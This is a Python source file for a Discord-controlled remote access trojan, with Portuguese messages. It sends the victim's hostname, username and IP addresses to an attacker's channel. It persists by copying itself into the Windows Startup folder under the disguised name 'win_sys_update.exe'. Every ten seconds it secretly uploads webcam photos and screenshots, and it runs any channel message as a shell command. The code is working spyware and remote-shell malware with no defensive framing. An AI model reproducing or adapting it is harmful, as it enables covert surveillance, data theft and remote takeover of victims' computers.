import cv2
import os
import sys
import threading
import time
import platform
import socket
import subprocess
import base64
import discord
import asyncio
import io
from discord.ext import tasks
import pyautogui
from datetime import datetime

CONFIG = {
    "TOKEN_B64": "", 
    "CHANNEL_ID_B64": "",
    "PHOTO_INTERVAL": 10,
    "FILE_NAME": "sys_log.jpg"
}

def decode_cfg(val):
    return base64.b64decode(val).decode('utf-8')

class ProfessionalAgent(discord.Client):
    def __init__(self):
        
        intents = discord.Intents.default()
        intents.message_content = True
        
        super().__init__(intents=intents)
        self.token = CONFIG["TOKEN_B64"]
        self.channel_id = int(CONFIG["CHANNEL_ID_B64"])
        
        print("Inicializando hardware da câmera...")
        self.cam = cv2.VideoCapture(0)
        time.sleep(1.0)

    

    async def send_text(self, text):
        try:
            channel = self.get_channel(self.channel_id)
            if channel: 
                await channel.send(text)
        except: 
            pass

    async def send_file(self, file_path):
        try:
            channel = self.get_channel(self.channel_id)
            if channel:
                await channel.send(file=discord.File(file_path))
                print(f"✅ Arquivo {file_path} enviado com sucesso para o Discord!")
            else:
                print(f"❌ [ERRO] Não encontrei nenhum canal com o ID: {self.channel_id}.")
        except Exception as e:
            print(f"❌ [ERRO AO ENVIAR ARQUIVO] Falha no upload para o Discord: {e}")

    # --- INICIALIZAÇÃO DO BOT ---
    async def on_ready(self):
        hostname = socket.gethostname()
        
      
        try:
            ipv4 = socket.gethostbyname(hostname)
        except:
            ipv4 = "Não detectado"
            
       
        ipv6 = "Não disponível"
        try:
            addr_info = socket.getaddrinfo(hostname, None, socket.AF_INET6)
            for item in addr_info:
                ip_texto = item[4][0]
                if ip_texto != "::1":
                    ipv6 = ip_texto
                    break
            else:
                ipv6 = "Apenas Local (::1 - Sem IPv6 de Rede)"
        except:
            pass

        info = (
            f"✅ Agente Online (Discord)\n"
            f"OS: {platform.system()}\n"
            f"User: {os.getlogin()}\n"
            f"IPv4: {ipv4}\n"
            f"IPv6: {ipv6}"
        )
        
        await self.send_text(info)
        self.persist()
        self.auto_photo_loop.start()

    
    @tasks.loop(seconds=10)
    async def auto_photo_loop(self):
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            
           
            nome_foto = f"sys_log_{timestamp}.jpg"
            if self.capture_cam(nome_foto):
                await self.send_file(nome_foto)
                try: 
                    os.remove(nome_foto)
                except: 
                    pass
                
            
            try:
                screenshot = pyautogui.screenshot()
                arr_bytes = io.BytesIO()
                screenshot.save(arr_bytes, format='PNG')
                arr_bytes.seek(0)
                
                channel = self.get_channel(self.channel_id)
                if channel:
                    await channel.send(file=discord.File(fp=arr_bytes, filename=f"print_{timestamp}.png"))
                    print(f"✅ Print screen automático enviado!")
            except Exception as e:
                print(f"❌ Erro crítico no print de tela: {e}")

        except Exception as e:
            print(f"Erro geral no loop: {e}")

    @auto_photo_loop.before_loop
    async def before_auto_photo_loop(self):
        await self.wait_until_ready()

    # --- AÇÕES DO SISTEMA ---
    def capture_cam(self, nome_arquivo):
        try:
            if not self.cam.isOpened():
                self.cam.open(0)
                time.sleep(0.5)

            ret, frame = self.cam.read()
            if ret:
                cv2.imwrite(nome_arquivo, frame)
                return True
        except Exception as e:
            print(f"Erro ao capturar frame da câmera: {e}")
        return False

    def shell_exec(self, cmd):
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return out.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Erro: {str(e)}"

    def persist(self):
        try:
            appdata = os.getenv('APPDATA')
            path = os.path.join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "win_sys_update.exe")
            if not os.path.exists(path):
                with open(sys.executable, "rb") as s, open(path, "wb") as d:
                    d.write(s.read())
        except: 
            pass

    
    async def on_message(self, message):
       
        if message.author == self.user or message.channel.id != self.channel_id:
            return

        texto = message.content.strip()

       
        if texto.lower() == "!print":
            try:
                await message.channel.send("📸 Capturando tela manualmente...")
                screenshot = pyautogui.screenshot()
                arr_bytes = io.BytesIO()
                screenshot.save(arr_bytes, format='PNG')
                arr_bytes.seek(0)
                await message.channel.send(file=discord.File(fp=arr_bytes, filename="print_manual.png"))
            except Exception as e:
                await message.channel.send(f"❌ Erro: {e}")
            return

        
        try:
            await message.channel.send(f"💻 Executando no terminal: `{texto}`")
            resultado = self.shell_exec(texto)
            
            
            if len(resultado) > 1900:
                resultado = resultado[:1900] + "\n...[Resultado cortado por tamanho]"
                
            await message.channel.send(f"```cmd\n{resultado}\n```")
        except Exception as e:
            await message.channel.send(f"❌ Erro ao processar comando: {e}")


if __name__ == "__main__":
    agent = ProfessionalAgent()
    agent.run(agent.token)
